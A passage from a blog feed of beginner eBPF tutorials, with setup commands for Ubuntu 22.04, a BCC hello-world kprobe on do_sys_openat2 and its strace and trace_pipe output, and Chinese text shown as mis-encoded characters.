class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>strace: <span class="hljs-built_in">exec</span>: Permission denied<br>+++ exited with 1 +++<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># chmod +x hello.py</span><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>bpf(BPF_BTF_LOAD, &#123;btf=<span class="hljs-string">&quot;\237\353\1\0\30\0\0\0\0\0\0\0\230\2\0\0\230\2\0\0\315\t\0\0\0\0\0\0\0\0\0\2&quot;</span>..., btf_log_buf=NULL, btf_size=3197, btf_log_size=0, btf_log_level=0&#125;, 128) = 3<br>bpf(BPF_PROG_LOAD, &#123;prog_type=BPF_PROG_TYPE_KPROBE, insn_cnt=13, insns=[&#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x21&#125;, &#123;code=BPF_STX|BPF_H|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-4, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x646c726f&#125;, &#123;code=BPF_STX|BPF_W|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-8, imm=0&#125;, &#123;code=BPF_LD|BPF_DW|BPF_IMM, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0x6c6c6548&#125;, &#123;code=BPF_LD|BPF_W|BPF_IMM, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x57202c6f&#125;, &#123;code=BPF_STX|BPF_DW|BPF_MEM, dst_reg=BPF_REG_10, src_reg=BPF_REG_1, off=-16, imm=0&#125;, &#123;code=BPF_ALU64|BPF_X|BPF_MOV, dst_reg=BPF_REG_1, src_reg=BPF_REG_10, off=0, imm=0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_ADD, dst_reg=BPF_REG_1, src_reg=BPF_REG_0, off=0, imm=0xfffffff0&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_2, src_reg=BPF_REG_0, off=0, imm=0xe&#125;, &#123;code=BPF_JMP|BPF_K|BPF_CALL, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0x6&#125;, &#123;code=BPF_ALU64|BPF_K|BPF_MOV, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;, &#123;code=BPF_JMP|BPF_K|BPF_EXIT, dst_reg=BPF_REG_0, src_reg=BPF_REG_0, off=0, imm=0&#125;], license=<span class="hljs-string">&quot;GPL&quot;</span>, log_level=0, log_size=0, log_buf=NULL, kern_version=KERNEL_VERSION(5, 15, 74), prog_flags=0, prog_name=<span class="hljs-string">&quot;hello_world&quot;</span>, prog_ifindex=0, expected_attach_type=BPF_CGROUP_INET_INGRESS, prog_btf_fd=3, func_info_rec_size=8, func_info=0x55cd34bb8700, func_info_cnt=1, line_info_rec_size=16, line_info=0x55cd34b42800, line_info_cnt=5, attach_btf_id=0, attach_prog_fd=0, fd_array=NULL&#125;, 128) = 4<br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.168992: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169022: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169047: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165284  [000] d...1 27977.169050: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006685: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.006702: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193472: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193486: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193505: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193711: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193712: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193806: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193807: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193900: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-165294  [000] d...1 27978.193902: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257082: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.257119: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506782: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.506819: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757435: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27978.757476: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006600: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.006637: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.203999: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204040: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204324: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204347: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.204716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.204729: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] d...1 27979.205191: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-165297  [000] dN..1 27979.205215: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] d...1 27979.212232: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-165298  [001] dN..1 27979.212317: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257070: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257121: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257315: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257323: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257356: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257357: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257426: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257428: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257496: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257497: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257515: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257516: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257626: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257627: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257699: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257700: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257716: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257717: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257732: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257733: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1 27979.257748: bpf_trace_printk: Hello, World!&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘first try2</title>
    <link href="/2023/01/29/ebpf/%E3%80%90ebpf%E3%80%91first%20try2/"/>
    <url>/2023/01/29/ebpf/%E3%80%90ebpf%E3%80%91first%20try2/</url>
    
    <content type="html"><![CDATA[<h2 id="è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯"><a href="#è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯" class="headerlink" title="è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯"></a>è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br><br></code></pre></td></tr></table></figure><p>æ­å»ºubuntuè™šæ‹Ÿæœºå¯ä»¥çœ‹åˆ°æˆ‘çš„å¦ä¸€ç¯‡æ•™ç¨‹ï¼š<br><a href="https://blog.csdn.net/weixin_42072280/article/details/128351846?spm=1001.2014.3001.5501"># ã€ç½‘ç»œæˆé•¿è®°ã€‘VMware16.2.2ä¸­åˆ›å»ºubuntu22.04.1è™šæ‹Ÿæœº+ä¿®æ”¹é™æ€ip+æ¢æº+mobaxtermè¿œç¨‹è¿æ¥+ä¿®æ”¹å‘½ä»¤æç¤ºç¬¦é¢œè‰²</a></p><h2 id="å®‰è£…-eBPF-å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·"><a href="#å®‰è£…-eBPF-å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·" class="headerlink" title="å®‰è£… eBPF å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·"></a>å®‰è£… eBPF å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># sudo apt-get install -y make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span><br></code></pre></td></tr></table></figure><h2 id="ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶"><a href="#ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶" class="headerlink" title="ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶"></a>ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶</h2><p>åœ¨ä½¿ç”¨ CO-RE ä¹‹å‰ï¼Œå†…æ ¸éœ€è¦å¼€å¯ CONFIG_DEBUG_INFO_BTF&#x3D;y å’Œ CONFIG_DEBUG_INFO&#x3D;y è¿™ä¸¤ä¸ªç¼–è¯‘é€‰é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /boot/config-5.15.0-58-generic  |grep -i config_debug_info</span><br>CONFIG_DEBUG_INFO=y<br><span class="hljs-comment"># CONFIG_DEBUG_INFO_REDUCED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_COMPRESSED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_SPLIT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF4 is not set</span><br>CONFIG_DEBUG_INFO_DWARF5=y<br>CONFIG_DEBUG_INFO_BTF=y<br>CONFIG_DEBUG_INFO_BTF_MODULES=y<br>[root@ubuntu-22 ~]<span class="hljs-comment">#</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ll /sys/kernel/btf/vmlinux</span><br>-r--r--r-- 1 root root 5178563  1æœˆ 29 16:02 /sys/kernel/btf/vmlinux<br><br></code></pre></td></tr></table></figure><h2 id="ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª-openat-ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨"><a href="#ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª-openat-ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª openat()ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨"></a>ç¬¬ä¸€ä¸ªebpfç¨‹åºï¼šè·Ÿè¸ª openat()ï¼ˆå³æ‰“å¼€æ–‡ä»¶ï¼‰ç³»ç»Ÿè°ƒç”¨</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨-C-å¼€å‘ä¸€ä¸ª-eBPF-ç¨‹åº"><a href="#ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨-C-å¼€å‘ä¸€ä¸ª-eBPF-ç¨‹åº" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨ C å¼€å‘ä¸€ä¸ª eBPF ç¨‹åº"></a>ç¬¬ä¸€æ­¥ï¼šä½¿ç”¨ C å¼€å‘ä¸€ä¸ª eBPF ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.c</span><br>int hello_world(void *ctx)<br>&#123;<br>    bpf_trace_printk(<span class="hljs-string">&quot;Hello, World!&quot;</span>);  // æœ€å¸¸ç”¨çš„ BPF è¾…åŠ©å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¾“å‡ºä¸€æ®µå­—ç¬¦ä¸²ã€‚ä¸è¿‡ï¼Œç”±äº eBPF è¿è¡Œåœ¨å†…æ ¸ä¸­ï¼Œå®ƒçš„è¾“å‡ºå¹¶ä¸æ˜¯é€šå¸¸çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œè€Œæ˜¯å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// eBPFç¨‹åºå¹¶ä¸èƒ½éšä¾¿çš„è°ƒç”¨å†…æ ¸å‡½æ•°ï¼Œå¿…é¡»é€šè¿‡è¾…åŠ©å‡½æ•°æ‰å¯å®ŒæˆeBPFç¨‹åºå’Œå…¶ä»–å†…æ ¸æ¨¡å—çš„äº¤äº’ï¼Œeg bpf_trace_printk()<br><br></code></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ­¥ï¼šä½¿ç”¨-Python-å’Œ-BCC-åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº"><a href="#ç¬¬äºŒæ­¥ï¼šä½¿ç”¨-Python-å’Œ-BCC-åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šä½¿ç”¨ Python å’Œ BCC åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº"></a>ç¬¬äºŒæ­¥ï¼šä½¿ç”¨ Python å’Œ BCC åº“å¼€å‘ä¸€ä¸ªç”¨æˆ·æ€ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat hello.py</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># 1) import bcc library</span><br><span class="hljs-comment"># å¯¼å…¥äº† BCC  åº“çš„ BPF æ¨¡å—ï¼Œä»¥ä¾¿æ¥ä¸‹æ¥è°ƒç”¨ï¼›</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 2) load BPF program</span><br><span class="hljs-comment"># è°ƒç”¨ BPF() åŠ è½½ç¬¬ä¸€æ­¥å¼€å‘çš„ BPF æºä»£ç ï¼›</span><br>b = BPF(src_file=<span class="hljs-string">&quot;hello.c&quot;</span>)<br><br><span class="hljs-comment"># 3) attach kprobe</span><br><span class="hljs-comment"># å°† BPF ç¨‹åºæŒ‚è½½åˆ°å†…æ ¸æ¢é’ˆï¼ˆç®€ç§° kprobeï¼‰ï¼Œå…¶ä¸­ do_sys_openat2() æ˜¯ç³»ç»Ÿè°ƒç”¨ openat() åœ¨å†…æ ¸ä¸­çš„å®ç°ï¼›</span><br><span class="hljs-comment"># è°ƒç”¨äº† attach_kprobe å‡½æ•°ï¼Œç»‘å®šäº†ä¸€ä¸ªå†…æ ¸è·Ÿè¸ªäº‹ä»¶</span><br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><br><span class="hljs-comment"># 4) read and print /sys/kernel/debug/tracing/trace_pipe</span><br><span class="hljs-comment"># è¯»å–å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe çš„å†…å®¹ï¼Œå¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚</span><br>b.trace_print()<br><br><br><span class="hljs-comment"># å†…æ ¸å‡½æ•° do_sys_openat2</span><br><br><span class="hljs-comment"># ç†è§£ï¼šopennat()å’Œopennat2()éƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨</span><br><span class="hljs-comment"># åœ¨è®¡ç®—æœºä¸­è¿è¡Œç¨‹åºã€è¯»å†™æ–‡ä»¶ï¼Œéƒ½ä¼šæ¶‰åŠåˆ°æ–‡ä»¶çš„æ‰“å¼€æ“ä½œï¼ŒLinux v5.10 ä¸æ–‡ä»¶æ‰“å¼€ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨æœ‰ open() / creat() / openat() / openat2è¿™å››ç±»ï¼Œåœ¨ä½¿ç”¨ glibc v2.32 æ—¶ï¼Œå‡ ä¹æ‰€æœ‰çš„æ–‡ä»¶æ‰“å¼€æ“ä½œä½¿ç”¨çš„éƒ½æ˜¯ openat2() è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</span><br><br><span class="hljs-comment"># ç”¨é«˜çº§è¯­è¨€å¼€å‘çš„ eBPF ç¨‹åºï¼Œéœ€è¦é¦–å…ˆç¼–è¯‘ä¸º BPF å­—èŠ‚ç ï¼Œç„¶åå€ŸåŠ© bpf ç³»ç»Ÿè°ƒç”¨åŠ è½½åˆ°å†…æ ¸ä¸­ï¼Œæœ€åå†é€šè¿‡æ€§èƒ½ç›‘æ§ç­‰æ¥å£ä¸å…·ä½“çš„å†…æ ¸äº‹ä»¶è¿›è¡Œç»‘å®šã€‚è¿™æ ·ï¼Œå†…æ ¸çš„æ€§èƒ½ç›‘æ§æ¨¡å—æ‰ä¼šåœ¨å†…æ ¸äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œæˆ‘ä»¬å¼€å‘çš„ eBPF ç¨‹åºã€‚</span><br></code></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ-eBPF-ç¨‹åº"><a href="#ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ-eBPF-ç¨‹åº" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ eBPF ç¨‹åº"></a>ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œ eBPF ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 